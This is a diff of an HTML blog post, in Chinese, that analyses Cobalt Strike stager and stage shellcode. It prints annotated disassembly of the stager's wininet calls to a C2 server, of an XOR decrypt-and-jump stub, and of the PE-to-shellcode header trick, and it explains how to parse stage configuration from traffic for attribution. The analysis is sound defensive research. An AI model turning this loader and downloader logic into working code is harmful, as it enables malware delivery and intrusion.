+0x0090:  68 6E 65 74 00          push   0x74656e
+0x0095:  68 77 69 6E 69          push   0x696e6977
+0x009a:  54                      push   esp                  
+0x009b:  68 4C 77 26 07          push   0x726774c
+; LoadLibraryA(&quot;wininet&quot;)
+0x00a0:  FF D5                   call   ebp                
 
-<span class="number">0x00a2</span>:  <span class="number">31</span> FF                   <span class="keyword">xor</span>    <span class="built_in">edi</span>, <span class="built_in">edi</span>
-<span class="number">0x00a4</span>:  <span class="number">57</span>                      <span class="keyword">push</span>   <span class="built_in">edi</span>
-<span class="number">0x00a5</span>:  <span class="number">57</span>                      <span class="keyword">push</span>   <span class="built_in">edi</span>
-<span class="number">0x00a6</span>:  <span class="number">57</span>                      <span class="keyword">push</span>   <span class="built_in">edi</span>
-<span class="number">0x00a7</span>:  <span class="number">57</span>                      <span class="keyword">push</span>   <span class="built_in">edi</span>
-<span class="number">0x00a8</span>:  <span class="number">57</span>                      <span class="keyword">push</span>   <span class="built_in">edi</span>
-<span class="number">0x00a9</span>:  <span class="number">68</span> 3A <span class="number">56</span> <span class="number">79</span> A7          <span class="keyword">push</span>   <span class="number">0xa779563a</span>
-<span class="comment">; InternetOpenA(NULL, NULL, NULL, NULL, NULL)</span>
-<span class="number">0x00ae</span>:  FF D5                   <span class="keyword">call</span>   <span class="built_in">ebp</span>
+0x00a2:  31 FF                   xor    edi, edi
+0x00a4:  57                      push   edi
+0x00a5:  57                      push   edi
+0x00a6:  57                      push   edi
+0x00a7:  57                      push   edi
+0x00a8:  57                      push   edi
+0x00a9:  68 3A 56 79 A7          push   0xa779563a
+; InternetOpenA(NULL, NULL, NULL, NULL, NULL)
+0x00ae:  FF D5                   call   ebp
 
-<span class="comment">; jmp -&gt; jmp -&gt; call 0xfffffdae 操作完成了将ip入栈的操作，然后pop到ebx</span>
-<span class="number">0x00b0</span>:  E9 <span class="number">84</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">jmp</span>    <span class="number">0x139</span>              
+; jmp -&gt; jmp -&gt; call 0xfffffdae 操作完成了将ip入栈的操作，然后pop到ebx
+0x00b0:  E9 84 00 00 00          jmp    0x139              
 
-<span class="number">0x00b5</span>:  5B                      <span class="keyword">pop</span>    <span class="built_in">ebx</span>                <span class="comment">; ip addr</span>
-<span class="number">0x00b6</span>:  <span class="number">31</span> C9                   <span class="keyword">xor</span>    <span class="built_in">ecx</span>, <span class="built_in">ecx</span>
-<span class="number">0x00b8</span>:  <span class="number">51</span>                      <span class="keyword">push</span>   <span class="built_in">ecx</span>
-<span class="number">0x00b9</span>:  <span class="number">51</span>                      <span class="keyword">push</span>   <span class="built_in">ecx</span>
-<span class="number">0x00ba</span>:  6A <span class="number">03</span>                   <span class="keyword">push</span>   <span class="number">3</span>
-<span class="number">0x00bc</span>:  <span class="number">51</span>                      <span class="keyword">push</span>   <span class="built_in">ecx</span>
-<span class="number">0x00bd</span>:  <span class="number">51</span>                      <span class="keyword">push</span>   <span class="built_in">ecx</span>
-<span class="number">0x00be</span>:  <span class="number">68</span> B5 <span class="number">40</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">push</span>   <span class="number">0x40b5</span>             <span class="comment">;port number</span>
-<span class="number">0x00c3</span>:  <span class="number">53</span>                      <span class="keyword">push</span>   <span class="built_in">ebx</span>                <span class="comment">;ip addr</span>
-<span class="number">0x00c4</span>:  <span class="number">50</span>                      <span class="keyword">push</span>   <span class="built_in">eax</span>
-<span class="number">0x00c5</span>:  <span class="number">68</span> <span class="number">57</span> <span class="number">89</span> 9F C6          <span class="keyword">push</span>   <span class="number">0xc69f8957</span>
-<span class="comment">; InternetConnectA(hInternet, serverIp, atoi(serverPort), NULL, NULL, 3, NULL, NULL)</span>
-<span class="number">0x00ca</span>:  FF D5                   <span class="keyword">call</span>   <span class="built_in">ebp</span>                
+0x00b5:  5B                      pop    ebx                ; ip addr
+0x00b6:  31 C9                   xor    ecx, ecx
+0x00b8:  51                      push   ecx
+0x00b9:  51                      push   ecx
+0x00ba:  6A 03                   push   3
+0x00bc:  51                      push   ecx
+0x00bd:  51                      push   ecx
+0x00be:  68 B5 40 00 00          push   0x40b5             ;port number
+0x00c3:  53                      push   ebx                ;ip addr
+0x00c4:  50                      push   eax
+0x00c5:  68 57 89 9F C6          push   0xc69f8957
+; InternetConnectA(hInternet, serverIp, atoi(serverPort), NULL, NULL, 3, NULL, NULL)
+0x00ca:  FF D5                   call   ebp                
 
-<span class="comment">; jmp  -&gt; call 0xce 将uri指针入栈 "/eFAp\x00"</span>
-<span class="number">0x00cc</span>:  EB <span class="number">70</span>                   <span class="keyword">jmp</span>    <span class="number">0x13e</span>              
-<span class="number">0x00ce</span>:  5B                      <span class="keyword">pop</span>    <span class="built_in">ebx</span>
-<span class="number">0x00cf</span>:  <span class="number">31</span> D2                   <span class="keyword">xor</span>    <span class="built_in">edx</span>, <span class="built_in">edx</span>
-<span class="number">0x00d1</span>:  <span class="number">52</span>                      <span class="keyword">push</span>   <span class="built_in">edx</span>
-<span class="number">0x00d2</span>:  <span class="number">68</span> <span class="number">00</span> <span class="number">02</span> <span class="number">40</span> <span class="number">84</span>          <span class="keyword">push</span>   <span class="number">0x84400200</span>
-<span class="number">0x00d7</span>:  <span class="number">52</span>                      <span class="keyword">push</span>   <span class="built_in">edx</span>
-<span class="number">0x00d8</span>:  <span class="number">52</span>                      <span class="keyword">push</span>   <span class="built_in">edx</span>
-<span class="number">0x00d9</span>:  <span class="number">52</span>                      <span class="keyword">push</span>   <span class="built_in">edx</span>
-<span class="number">0x00da</span>:  <span class="number">53</span>                      <span class="keyword">push</span>   <span class="built_in">ebx</span>
-<span class="number">0x00db</span>:  <span class="number">52</span>                      <span class="keyword">push</span>   <span class="built_in">edx</span>
-<span class="number">0x00dc</span>:  <span class="number">50</span>                      <span class="keyword">push</span>   <span class="built_in">eax</span>
-<span class="number">0x00dd</span>:  <span class="number">68</span> EB <span class="number">55</span> 2E 3B          <span class="keyword">push</span>   <span class="number">0x3b2e55eb</span>
-<span class="comment">; HttpOpenRequestA(hConnection, NULL, serveruri, NULL, NULL, NULL, 0x84400200, NULL);</span>
-<span class="number">0x00e2</span>:  FF D5                   <span class="keyword">call</span>   <span class="built_in">ebp</span>                
+; jmp  -&gt; call 0xce 将uri指针入栈 &quot;/eFAp\x00&quot;
+0x00cc:  EB 70                   jmp    0x13e              
+0x00ce:  5B                      pop    ebx
+0x00cf:  31 D2                   xor    edx, edx
+0x00d1:  52                      push   edx
+0x00d2:  68 00 02 40 84          push   0x84400200
+0x00d7:  52                      push   edx
+0x00d8:  52                      push   edx
+0x00d9:  52                      push   edx
+0x00da:  53                      push   ebx
+0x00db:  52                      push   edx
+0x00dc:  50                      push   eax
+0x00dd:  68 EB 55 2E 3B          push   0x3b2e55eb
+; HttpOpenRequestA(hConnection, NULL, serveruri, NULL, NULL, NULL, 0x84400200, NULL);
+0x00e2:  FF D5                   call   ebp                
 
-<span class="number">0x00e4</span>:  <span class="number">89</span> C6                   <span class="keyword">mov</span>    <span class="built_in">esi</span>, <span class="built_in">eax</span>
-<span class="number">0x00e6</span>:  <span class="number">83</span> C3 <span class="number">50</span>                <span class="keyword">add</span>    <span class="built_in">ebx</span>, <span class="number">0x50</span>           <span class="comment">; uri + 0x50 处的header</span>
-<span class="number">0x00e9</span>:  <span class="number">31</span> FF                   <span class="keyword">xor</span>    <span class="built_in">edi</span>, <span class="built_in">edi</span>
-<span class="number">0x00eb</span>:  <span class="number">57</span>                      <span class="keyword">push</span>   <span class="built_in">edi</span>
-<span class="number">0x00ec</span>:  <span class="number">57</span>                      <span class="keyword">push</span>   <span class="built_in">edi</span>
-<span class="number">0x00ed</span>:  6A FF                   <span class="keyword">push</span>   -<span class="number">1</span>
-<span class="number">0x00ef</span>:  <span class="number">53</span>                      <span class="keyword">push</span>   <span class="built_in">ebx</span>
-<span class="number">0x00f0</span>:  <span class="number">56</span>                      <span class="keyword">push</span>   <span class="built_in">esi</span>
-<span class="number">0x00f1</span>:  <span class="number">68</span> <span class="number">2D</span> <span class="number">06</span> <span class="number">18</span> 7B          <span class="keyword">push</span>   <span class="number">0x7b18062d</span>
-<span class="comment">; HttpSendRequestA( HINTERNET hRequest, LPCSTR lpszHeaders, 0xFFFFFFFF, NULL, 0)</span>
-<span class="number">0x00f6</span>:  FF D5                   <span class="keyword">call</span>   <span class="built_in">ebp</span>          
+0x00e4:  89 C6                   mov    esi, eax
+0x00e6:  83 C3 50                add    ebx, 0x50           ; uri + 0x50 处的header
+0x00e9:  31 FF                   xor    edi, edi
+0x00eb:  57                      push   edi
+0x00ec:  57                      push   edi
+0x00ed:  6A FF                   push   -1
+0x00ef:  53                      push   ebx
+0x00f0:  56                      push   esi
+0x00f1:  68 2D 06 18 7B          push   0x7b18062d
+; HttpSendRequestA( HINTERNET hRequest, LPCSTR lpszHeaders, 0xFFFFFFFF, NULL, 0)
+0x00f6:  FF D5                   call   ebp          
 
-<span class="number">0x00f8</span>:  <span class="number">85</span> C0                   <span class="keyword">test</span>   <span class="built_in">eax</span>, <span class="built_in">eax</span>
-<span class="number">0x00fa</span>:  0F <span class="number">84</span> C3 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">je</span>     <span class="number">0x2c3</span>
-<span class="number">0x0100</span>:  <span class="number">31</span> FF                   <span class="keyword">xor</span>    <span class="built_in">edi</span>, <span class="built_in">edi</span>
-<span class="number">0x0102</span>:  <span class="number">85</span> F6                   <span class="keyword">test</span>   <span class="built_in">esi</span>, <span class="built_in">esi</span>
-<span class="number">0x0104</span>:  <span class="number">74</span> <span class="number">04</span>                   <span class="keyword">je</span>     <span class="number">0x10a</span>
-<span class="number">0x0106</span>:  <span class="number">89</span> F9                   <span class="keyword">mov</span>    <span class="built_in">ecx</span>, <span class="built_in">edi</span>
-<span class="number">0x0108</span>:  EB <span class="number">09</span>                   <span class="keyword">jmp</span>    <span class="number">0x113</span>
-<span class="number">0x010a</span>:  <span class="number">68</span> AA C5 E2 <span class="number">5D</span>          <span class="keyword">push</span>   <span class="number">0x5de2c5aa</span>
-<span class="number">0x010f</span>:  FF D5                   <span class="keyword">call</span>   <span class="built_in">ebp</span>
-<span class="number">0x0111</span>:  <span class="number">89</span> C1                   <span class="keyword">mov</span>    <span class="built_in">ecx</span>, <span class="built_in">eax</span>
-<span class="number">0x0113</span>:  <span class="number">68</span> <span class="number">45</span> <span class="number">21</span> 5E <span class="number">31</span>          <span class="keyword">push</span>   <span class="number">0x315e2145</span>
- <span class="comment">; GetDesktopWindow()</span>
-<span class="number">0x0118</span>:  FF D5                   <span class="keyword">call</span>   <span class="built_in">ebp</span>               
+0x00f8:  85 C0                   test   eax, eax
+0x00fa:  0F 84 C3 01 00 00       je     0x2c3
+0x0100:  31 FF                   xor    edi, edi
+0x0102:  85 F6                   test   esi, esi
+0x0104:  74 04                   je     0x10a
+0x0106:  89 F9                   mov    ecx, edi
+0x0108:  EB 09                   jmp    0x113
+0x010a:  68 AA C5 E2 5D          push   0x5de2c5aa
+0x010f:  FF D5                   call   ebp
+0x0111:  89 C1                   mov    ecx, eax
+0x0113:  68 45 21 5E 31          push   0x315e2145
+ ; GetDesktopWindow()
+0x0118:  FF D5                   call   ebp               
 
-<span class="number">0x011a</span>:  <span class="number">31</span> FF                   <span class="keyword">xor</span>    <span class="built_in">edi</span>, <span class="built_in">edi</span>
-<span class="number">0x011c</span>:  <span class="number">57</span>                      <span class="keyword">push</span>   <span class="built_in">edi</span>
-<span class="number">0x011d</span>:  6A <span class="number">07</span>                   <span class="keyword">push</span>   <span class="number">7</span>
-<span class="number">0x011f</span>:  <span class="number">51</span>                      <span class="keyword">push</span>   <span class="built_in">ecx</span>
-<span class="number">0x0120</span>:  <span class="number">56</span>                      <span class="keyword">push</span>   <span class="built_in">esi</span>
-<span class="number">0x0121</span>:  <span class="number">50</span>                      <span class="keyword">push</span>   <span class="built_in">eax</span>
-<span class="number">0x0122</span>:  <span class="number">68</span> B7 <span class="number">57</span> E0 <span class="number">0B</span>          <span class="keyword">push</span>   <span class="number">0xbe057b7</span>
- <span class="comment">; InternetErrorDlg(eax, esi, ecx, 7, 0)</span>
-<span class="number">0x0127</span>:  FF D5                   <span class="keyword">call</span>   <span class="built_in">ebp</span>               
+0x011a:  31 FF                   xor    edi, edi
+0x011c:  57                      push   edi
+0x011d:  6A 07                   push   7
+0x011f:  51                      push   ecx
+0x0120:  56                      push   esi
+0x0121:  50                      push   eax
+0x0122:  68 B7 57 E0 0B          push   0xbe057b7
+ ; InternetErrorDlg(eax, esi, ecx, 7, 0)
+0x0127:  FF D5                   call   ebp               
 ...
 </code></pre>
 <p>利用scdbg模拟执行Shellcode我们能够快速了解Shellcode到底执行了哪些函数：</p>
 <p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201021174738015.png" alt="image-20201021174738015"></p>
 <p>至此，Stager Shellcode也大致分析完毕了。</p>
-<h2 id="二-stage-shellcode"><a class="markdownIt-Anchor" href="#二-stage-shellcode"></a> 二、 Stage Shellcode</h2>
-<h3 id="1-stub-shellcode"><a class="markdownIt-Anchor" href="#1-stub-shellcode"></a> 1. Stub Shellcode</h3>
-<p>我们知道，当Stager Shellcode成功执行后会发起HTTP请求，而C&amp;C服务器会在简单的校验之后返回一个包含Stage Shellcode的响应，如下图的中标出的部分：</p>
+<h2 id="二、-Stage-Shellcode"><a href="#二、-Stage-Shellcode" class="headerlink" title="二、 Stage Shellcode"></a>二、 Stage Shellcode</h2><h3 id="1-Stub-Shellcode"><a href="#1-Stub-Shellcode" class="headerlink" title="1. Stub Shellcode"></a>1. Stub Shellcode</h3><p>我们知道，当Stager Shellcode成功执行后会发起HTTP请求，而C&amp;C服务器会在简单的校验之后返回一个包含Stage Shellcode的响应，如下图的中标出的部分：</p>
 <p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201021152015469.png" alt="image-20201021152015469"></p>
 <p>该<code>Stage</code>包含众多信息，而我们如果能够得到流量，那么解析该<code>Stage</code>就能够极大地帮助溯源工作：</p>
 <ol>
-<li>
-<p>C2 Server addr/domain &amp; public key</p>
+<li><p>C2 Server addr/domain &amp; public key</p>
 </li>
-<li>
-<p>Beacon info decided by melleable C2 profile</p>
+<li><p>Beacon info decided by melleable C2 profile</p>
 </li>
-<li>
-<p>Domain Fronting or not (HostHeader)</p>
+<li><p>Domain Fronting or not (HostHeader)</p>
 </li>
-<li>
-<p>Cobalt Strike Version</p>
+<li><p>Cobalt Strike Version</p>
 </li>
 </ol>
 <p>Stub是一段解密Shellcode主体执行的引导代码，会利用紧跟其后的异或密钥Xor_key和异或后的加密长度Xor_len进行解密Shellcode主体并执行。</p>
@@ -702,92 +683,86 @@ ole32!IMAGE_EXPORT_DIRECTORY
 <p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201021152435115.png" alt="image-20201021152435115"></p>
 <p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201021153241758.png" alt="image-20201021153241758"></p>
 <p>这些Xor.bin中的这些Stub仅是利用寄存器不同而已，所以字节码看起来也是不同的，但是实际做的操作是一样的。我们简单地看一下x86的Stub Shellcode，其主要的目的还是异或解密Shellcode并跳到Shellcode执行：</p>
-<pre class="highlight"><code class="x86asm"><span class="number">0x0000</span>:  FC                <span class="keyword">cld</span>                       <span class="comment">;清除标志位</span>
-<span class="number">0x0001</span>:  E8 <span class="number">0B</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    <span class="keyword">call</span>   <span class="number">0x11</span>               <span class="comment">;跳过垃圾数据</span>
-<span class="number">0x0002</span>:  2E7140B186A83360250A17                      <span class="comment">;junk data</span>
-<span class="number">0x0011</span>:  EB 2B             <span class="keyword">jmp</span>  <span class="number">0x3e</span>                 <span class="comment">;通过call得到xor_key地址</span>
-<span class="number">0x0013</span>:  <span class="number">5D</span>                <span class="keyword">pop</span>  <span class="built_in">ebp</span>                  <span class="comment">;ebp=xor_key_addr</span>
+<pre><code class="lang-x86asm">0x0000:  FC                cld                       ;清除标志位
+0x0001:  E8 0B 00 00 00    call   0x11               ;跳过垃圾数据
+0x0002:  2E7140B186A83360250A17                      ;junk data
+0x0011:  EB 2B             jmp  0x3e                 ;通过call得到xor_key地址
+0x0013:  5D                pop  ebp                  ;ebp=xor_key_addr
 
-<span class="number">0x0014</span>:  8B <span class="number">7D</span> <span class="number">00</span>          <span class="keyword">mov</span>  <span class="built_in">edi</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>] <span class="comment">;获取前4个字节，即edi=xor_key</span>
-<span class="number">0x0017</span>:  <span class="number">83</span> C5 <span class="number">04</span>          <span class="keyword">add</span>  <span class="built_in">ebp</span>, <span class="number">4</span>
-<span class="number">0x001a</span>:  8B <span class="number">75</span> <span class="number">00</span>          <span class="keyword">mov</span>  <span class="built_in">esi</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>] <span class="comment">;获取5-8个字节，即异或key得到内容长度</span>
-<span class="number">0x001d</span>:  <span class="number">31</span> FE             <span class="keyword">xor</span>  <span class="built_in">esi</span>, <span class="built_in">edi</span>             <span class="comment">;esi=内容长度</span>
-<span class="number">0x001f</span>:  <span class="number">83</span> C5 <span class="number">04</span>          <span class="keyword">add</span>  <span class="built_in">ebp</span>, <span class="number">4</span> 
-<span class="number">0x0022</span>:  <span class="number">55</span>                <span class="keyword">push</span> <span class="built_in">ebp</span>                  <span class="comment">;加密的shellcode地址入栈，提供后续调用</span>
-<span class="comment">;============================================= 循环xor解密 ====================================================</span>
-<span class="number">0x0023</span>:  8B <span class="number">5D</span> <span class="number">00</span>          <span class="keyword">mov</span>  <span class="built_in">ebx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>] <span class="comment">;每4字节为一组进行异或解密</span>
-<span class="number">0x0026</span>:  <span class="number">31</span> FB             <span class="keyword">xor</span>  <span class="built_in">ebx</span>, <span class="built_in">edi</span>
-<span class="number">0x0028</span>:  <span class="number">89</span> <span class="number">5D</span> <span class="number">00</span>          <span class="keyword">mov</span>  <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>], <span class="built_in">ebx</span>
-<span class="number">0x002b</span>:  <span class="number">31</span> DF             <span class="keyword">xor</span>  <span class="built_in">edi</span>, <span class="built_in">ebx</span>
-<span class="number">0x002d</span>:  <span class="number">83</span> C5 <span class="number">04</span>          <span class="keyword">add</span>  <span class="built_in">ebp</span>, <span class="number">4</span>
-<span class="number">0x0030</span>:  <span class="number">83</span> EE <span class="number">04</span>          <span class="keyword">sub</span>  <span class="built_in">esi</span>, <span class="number">4</span>
-<span class="number">0x0033</span>:  <span class="number">31</span> <span class="built_in">DB</span>             <span class="keyword">xor</span>  <span class="built_in">ebx</span>, <span class="built_in">ebx</span>
-<span class="number">0x0035</span>:  <span class="number">39</span> DE             <span class="keyword">cmp</span>  <span class="built_in">esi</span>, <span class="built_in">ebx</span>
-<span class="number">0x0037</span>:  <span class="number">74</span> <span class="number">02</span>             <span class="keyword">je</span>   <span class="number">0x3b</span>                   <span class="comment">;根据长度判断解密完毕</span>
-<span class="number">0x0039</span>:  EB E8             <span class="keyword">jmp</span>  <span class="number">0x23</span>
-<span class="number">0x003b</span>:  5F                <span class="keyword">pop</span>  <span class="built_in">edi</span>                    <span class="comment">;取出Shellcode地址</span>
-<span class="number">0x003c</span>:  FF E7             <span class="keyword">jmp</span>  <span class="built_in">edi</span>                    <span class="comment">;执行解密后的shellcode</span>
-<span class="number">0x003e</span>:  E8 D0 FF FF FF    <span class="keyword">call</span> <span class="number">0x13</span>                   <span class="comment">;获取下一指令的地址</span>
+0x0014:  8B 7D 00          mov  edi, dword ptr [ebp] ;获取前4个字节，即edi=xor_key
+0x0017:  83 C5 04          add  ebp, 4
+0x001a:  8B 75 00          mov  esi, dword ptr [ebp] ;获取5-8个字节，即异或key得到内容长度
+0x001d:  31 FE             xor  esi, edi             ;esi=内容长度
+0x001f:  83 C5 04          add  ebp, 4 
+0x0022:  55                push ebp                  ;加密的shellcode地址入栈，提供后续调用
+;============================================= 循环xor解密 ====================================================
+0x0023:  8B 5D 00          mov  ebx, dword ptr [ebp] ;每4字节为一组进行异或解密
+0x0026:  31 FB             xor  ebx, edi
+0x0028:  89 5D 00          mov  dword ptr [ebp], ebx
+0x002b:  31 DF             xor  edi, ebx
+0x002d:  83 C5 04          add  ebp, 4
+0x0030:  83 EE 04          sub  esi, 4
+0x0033:  31 DB             xor  ebx, ebx
+0x0035:  39 DE             cmp  esi, ebx
+0x0037:  74 02             je   0x3b                   ;根据长度判断解密完毕
+0x0039:  EB E8             jmp  0x23
+0x003b:  5F                pop  edi                    ;取出Shellcode地址
+0x003c:  FF E7             jmp  edi                    ;执行解密后的shellcode
+0x003e:  E8 D0 FF FF FF    call 0x13                   ;获取下一指令的地址
 </code></pre>
 <p>我们通过CS源码和汇编解密注意到这么循环加密的操作是<strong>有一些小问题的</strong>：因为xor_key没有起到其应有的作用，每个4字节长加密的数据块可以通过和上一块数据块进行异或直接获取到明文。</p>
 <p>我们简单画个图说明一下CS的异或加密方式：</p>
 <p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201021174422078.png" alt="image-20201021174422078"></p>
 <p>简单地用公式表示为：</p>
-<p>$$<br>
-\begin{align}<br>
-C_1 &amp;= P_1{\oplus}Key \<br>
-C_2 &amp;= C_1{\oplus}P_2 \<br>
-C_3 &amp;= C_2{\oplus}P_3 \<br>
-… \<br>
-C_n &amp;= C_{n-1}{\oplus}P_n<br>
-\end{align}<br>
-$$</p>
-<p>那么由于异或的特性，我们有：</p>
-<p>$$<br>
-\begin{align}<br>
-P_2 &amp;= C_1{\oplus}C_2 \<br>
-P_3 &amp;= C_2{\oplus}C_3 \<br>
-… \<br>
-P_n &amp;= C_{n-1}{\oplus}C_n<br>
-\end{align}<br>
-$$</p>
-<p>也就是说这种加密方式根本不需要xor_key也能直接得到明文Shellcode，当然，从公式来看前四字节的明文还是需要xor_key的。但是后面我们就会知道，这段加密的Shellcode使用了<strong>PE_TO_SHELLCODE</strong>技术，前四字节是PE头标志 <code>&quot;MZ&quot;</code>以及<code>call</code> 下一行或加了<code>junk code</code>偏移之后的字节码<code>\xE8\x&lt;??&gt;\x00\x00\x00</code>，即前三个字节是固定的<code>\x4D\x5A\xE8\x&lt;??&gt;</code>，而<code>\x&lt;??&gt;</code>可以通过还原后面的跳转偏移还原出来，一句话总结就是：这种加密方式无需<code>xor_key</code>即可还原成明文，即加密无效。</p>
+<script type="math/tex; mode=display">
+\begin{align}
+C_1 &= P_1{\oplus}Key \\
+C_2 &= C_1{\oplus}P_2 \\
+C_3 &= C_2{\oplus}P_3 \\
+... \\
+C_n &= C_{n-1}{\oplus}P_n
+\end{align}</script><p>那么由于异或的特性，我们有：</p>
+<script type="math/tex; mode=display">
+\begin{align}
+P_2 &= C_1{\oplus}C_2 \\
+P_3 &= C_2{\oplus}C_3 \\
+... \\
+P_n &= C_{n-1}{\oplus}C_n
+\end{align}</script><p>也就是说这种加密方式根本不需要xor_key也能直接得到明文Shellcode，当然，从公式来看前四字节的明文还是需要xor_key的。但是后面我们就会知道，这段加密的Shellcode使用了<strong>PE_TO_SHELLCODE</strong>技术，前四字节是PE头标志 <code>&quot;MZ&quot;</code>以及<code>call</code> 下一行或加了<code>junk code</code>偏移之后的字节码<code>\xE8\x&lt;??&gt;\x00\x00\x00</code>，即前三个字节是固定的<code>\x4D\x5A\xE8\x&lt;??&gt;</code>，而<code>\x&lt;??&gt;</code>可以通过还原后面的跳转偏移还原出来，一句话总结就是：这种加密方式无需<code>xor_key</code>即可还原成明文，即加密无效。</p>
 <p>当然，既然CS在Stage中传输了<code>xor_key</code>那么就必然不是因为防止被解密而进行的异或加密，而它的主要目的就是防止静态查杀。只是从加解密的角度来看，<code>xor_key</code>的传输稍显“多余”的。</p>
-<h3 id="2-动手实践"><a class="markdownIt-Anchor" href="#2-动手实践"></a> 2. 动手实践</h3>
-<p>解析了<code>Stage</code>结构之后，我们可以由此解密出的<code>Stage Shellcode</code>。</p>
+<h3 id="2-动手实践"><a href="#2-动手实践" class="headerlink" title="2. 动手实践"></a>2. 动手实践</h3><p> 解析了<code>Stage</code>结构之后，我们可以由此解密出的<code>Stage Shellcode</code>。</p>
 <p>开源项目<a href="https://github.com/Sentinel-One/CobaltStrikeParser" target="_blank" rel="noopener">[CobaltStrikeParser]</a>对<strong>解密后的Shellcode</strong>进行配置解析，原本该项目是<strong>用于解析CS dump 内存或PE的</strong>， 现在被我们用来直接解析下载过程中包含的Stage Shellcode（本质上就是解密后的PE文件）。我们直接拿过来封装一层解密以及添加一些Shellcode类型判断即可。</p>
-<p>所谓<strong>磨刀不误砍柴工</strong>，若以后再次抓到样本的通信流量就可以快速地得到CS配置信息，从而快速判断攻 击手法和C&amp;C服务器进行溯源。</p>
+<p>所谓<strong>磨刀不误砍柴工</strong>，若以后再次抓到样本的通信流量就可以快速地得到CS配置信息，从而快速判断攻 击手法和C&amp;C服务器进行溯源。 </p>
 <p>由于32位的shellcode会随即填充一些垃圾数据避免静态查杀，而64位不会，则我们直接用xor64.bin判断是否是64位的shellcode即可。</p>
-<p>效果如下图，<strong>cs_stage_parse</strong>（有时间再上github吧）：</p>
+<p>效果如下图，<strong>cs_stage_parse</strong>（有时间再上github吧）： </p>
 <p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201022173817069.png" alt="image-20201022173817069"></p>
-<h3 id="3-pe-to-shellcode"><a class="markdownIt-Anchor" href="#3-pe-to-shellcode"></a> 3. PE to Shellcode</h3>
-<p>CS将装载有较完整的恶意功能的PE可执行文件通过<strong>PE_TO_SHELLCODE</strong>技术变成了既可以内存加载执行，也可以像正常EXE文件双击执行的格式。当然，这么做主要还是想将PE文件当做Shellcode执行，从而达到无文件落地目的。</p>
-<p><strong>注：这一节将不会重点展开，因为这一技术并非</strong>Shellcode<strong>的重点。</strong></p>
-<p><strong>PE_TO_SHELLCODE</strong>技术的大致思路就是利用DOS头的标志 <code>&quot;MZ&quot;</code> 字符字节码 <code>\x4D\x5A</code>正好对应着汇编的<code>dec ebp</code>和 <code>pop edx</code>，<code>EIP</code>若指向这里运行则不会崩溃，可以通过<code>push edx</code>和<code>inc ebp</code>进行补救。而我们知道DOS头中比较重要的字段就是开头的 <code>MZ</code>标识和 PE头的偏移字段 <code>elfanew</code>，只 要这两个字段正确，就能识别为正确的PE文件。故可以在DOS头中添加Shellcode，使在不破坏DOS头关键字段的前提下跳转到Stub处执行，而Stub则充当<code>PE Loader</code>的作用，将PE 正常地映射在内存中然后跳转到程序入口执行。</p>
+<h3 id="3-PE-to-Shellcode"><a href="#3-PE-to-Shellcode" class="headerlink" title="3. PE to Shellcode"></a>3. PE to Shellcode</h3><p>CS将装载有较完整的恶意功能的PE可执行文件通过<strong>PE_TO_SHELLCODE</strong>技术变成了既可以内存加载执行，也可以像正常EXE文件双击执行的格式。当然，这么做主要还是想将PE文件当做Shellcode执行，从而达到无文件落地目的。 </p>
+<p><strong>注：这一节将不会重点展开，因为这一技术并非</strong>Shellcode<strong>的重点。</strong> </p>
+<p><strong>PE_TO_SHELLCODE</strong>技术的大致思路就是利用DOS头的标志 <code>&quot;MZ&quot;</code> 字符字节码 <code>\x4D\x5A</code>正好对应着汇编的<code>dec ebp</code>和 <code>pop edx</code>，<code>EIP</code>若指向这里运行则不会崩溃，可以通过<code>push edx</code>和<code>inc ebp</code>进行补救。而我们知道DOS头中比较重要的字段就是开头的 <code>MZ</code>标识和 PE头的偏移字段 <code>elfanew</code>，只 要这两个字段正确，就能识别为正确的PE文件。故可以在DOS头中添加Shellcode，使在不破坏DOS头关键字段的前提下跳转到Stub处执行，而Stub则充当<code>PE Loader</code>的作用，将PE 正常地映射在内存中然后跳转到程序入口执行。 </p>
 <p>CS的PE文件DOS头解析成汇编后如下：</p>
-<pre class="highlight"><code class="x86asm"><span class="number">0x00000</span>:  <span class="number">4D</span>                 <span class="keyword">dec</span>  <span class="built_in">ebp</span>    <span class="comment">;"M"</span>
-<span class="number">0x00001</span>:  5A                 <span class="keyword">pop</span>  <span class="built_in">edx</span>    <span class="comment">;"Z"</span>
-<span class="number">0x00002</span>:  E8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>     <span class="keyword">call</span> <span class="number">7</span>      <span class="comment">;call下一行，即下一行地址入栈</span>
-<span class="number">0x00007</span>:  5B                 <span class="keyword">pop</span>  <span class="built_in">ebx</span>    <span class="comment">;ebx=下一行地址   </span>
-<span class="number">0x00008</span>:  <span class="number">89</span> DF              <span class="keyword">mov</span>  <span class="built_in">edi</span>, <span class="built_in">ebx</span> <span class="comment">;</span>
-<span class="number">0x0000a</span>:  <span class="number">52</span>                 <span class="keyword">push</span> <span class="built_in">edx</span>    <span class="comment">;抵消pop edx</span>
-<span class="number">0x0000b</span>:  <span class="number">45</span>                 <span class="keyword">inc</span>  <span class="built_in">ebp</span>    <span class="comment">;抵消dec ebp</span>
-<span class="number">0x0000c</span>:  <span class="number">55</span>                 <span class="keyword">push</span> <span class="built_in">ebp</span>    <span class="comment">;保存栈底</span>
-<span class="number">0x0000d</span>:  <span class="number">89</span> E5              <span class="keyword">mov</span>  <span class="built_in">ebp</span>, <span class="built_in">esp</span> <span class="comment">;调整栈帧</span>
